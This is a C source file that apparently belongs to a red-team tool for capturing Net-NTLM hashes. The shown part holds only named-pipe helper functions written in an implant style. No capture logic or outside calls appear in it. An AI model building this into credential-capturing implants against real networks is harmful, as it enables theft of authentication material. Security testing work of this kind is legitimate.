/**
 *
 * Captures incoming Net-NTLMv1/v2 hashes
 * for incoming authentication attempts 
 * via NTLM.
 *
 * GuidePoint Security LLC
 * Threat and Attack Simulation
 *
**/

#include "common.h"

/**
 *
 * @brief:	Create a named pipe server.
 *
 * @param:	API table.
 * @param:	PIpe name.
 *
**/
D_SEC( E ) HANDLE PipeInit( _In_ PAPI Api, _In_ PCHAR Name )
{
	return Api->CreateNamedPipeA( Name,
				      PIPE_ACCESS_DUPLEX,
				      PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
				      1,
				      1024 * 1024, /* Extend to 1MB? */
				      1024 * 1024, /* Extend to 1MB? */
				      0,
				      NULL );
};

/**
 *
 * @brief:	Waits for a connection from a client.
 *
 * @param:	Pointer to API structure.
 * @param:	Pointer to a pipe handle.
 *
**/

D_SEC( E ) BOOL PipeWait( _In_ PAPI Api, _In_ HANDLE Pipe )
{
	if ( ! Api->ConnectNamedPipe( Pipe, NULL ) ) {
		if ( NtCurrentTeb()->LastErrorValue != STATUS_PIPE_CONNECTED ) {
			return FALSE;
		};
	};
	return TRUE;
};

/**
 *
 * @brief:	Creates a printf formatted message over a pipe.
 *
 * @param:	Pointer to API structure.
 * @param:	Pointer to a pipe handle.
 * @param:	Format string.
 * @param:	Arguments.
 *
**/

D_SEC( E ) BOOL PipePrint( _In_ PAPI Api, _In_ HANDLE Pipe, _In_ PCHAR Format, ... )
{
	INT		Len = 0;
	ULONG		Wrt = 0;
	BOOL		Ret = FALSE;
	PVOID		Str = NULL;
	va_list		Lst = NULL;

	va_start( Lst, Format );
	Len = Api->vsnprintf( NULL, 0, Format, Lst );
	va_end( Lst );

	if ( ( Str = Api->VirtualAlloc( NULL, Len + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) ) != NULL ) {
		va_start( Lst, Format );
		Api->vsnprintf( Str, Len, Format, Lst );
		va_end( Lst );

		Ret = Api->WriteFile( Pipe, Str, Len + 1, &Wrt, NULL );
		Api->VirtualFree( Str, 0, MEM_RELEASE );
	};
	return Ret;
};
